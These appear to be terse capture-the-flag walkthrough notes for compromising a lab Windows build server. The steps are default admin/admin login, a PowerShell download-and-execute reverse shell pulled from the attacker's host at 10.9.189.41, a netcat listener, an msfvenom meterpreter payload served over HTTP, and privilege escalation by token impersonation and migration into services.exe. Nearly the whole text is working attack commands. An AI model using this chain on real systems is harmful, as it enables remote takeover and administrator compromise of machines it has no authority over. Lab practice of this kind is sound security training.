
nmap 10.10.19.52 -Pn -sV

*** To Browser

10.10.19.52:8080

UID: admin

Password: admin

** Build new project

** Find any executable input

powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.189.41:9999/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.189.41 -Port 8000

Save it, but don't run right now.

*** Create a server to host the payload(Invoke-PowerShellTcp.ps1)

python3 -m http.server 9999

*** Create a Listener with netcat

nc -lnvp 8000

***After setting up server and listener, build the project.

** It will capture and download the payload from server.

** Then we get a connention to netcat listener.

  ----------  --------------  --------------  
  
*** To make easy privilege escalation, we need to use Metasploit

** Creating meterpreter payload

msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=10.9.189.41 LPORT=2222 -f exe -o shell.exe

** Hosting meterpreter payload to server

python3 -m http.server 1234

** Open listener to Metasploit Multi Handler

msfconsole 

use exploit/multi/handler 

set PAYLOAD windows/meterpreter/reverse_tcp 

set LHOST 10.9.189.41 

set LPORT 2222

run

*** Now call the Powershell download script to run the meterpreter payload.

** Use the connected netcat listener.

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.189.41:1234/shell.exe','shell.exe')"

** In server (port 1234), we get a 200 response. So it's downloaded.

** To execute the payload to netcat

Start-Process "shell.exe"

** We got a meterpreter session

** meterpreter >
-----------------------------------------------------

whoami /priv

** Let's use the incognito module that will allow us to exploit this vulnerability. 

use incognito 

** To check which tokens are available

list_tokens -g

** BUILTIN\Administrators token is available


** To impersonate the Administrators' token

impersonate_token "BUILTIN\Administrators" 

** Ensure that you migrate to a process with the correct permissions

** The safest process to pick is the services.exe process.

ps

** Find the PID of the services.exe process.

** Migrate to this process

migrate PID-OF-PROCESS



  
  
  
  
  
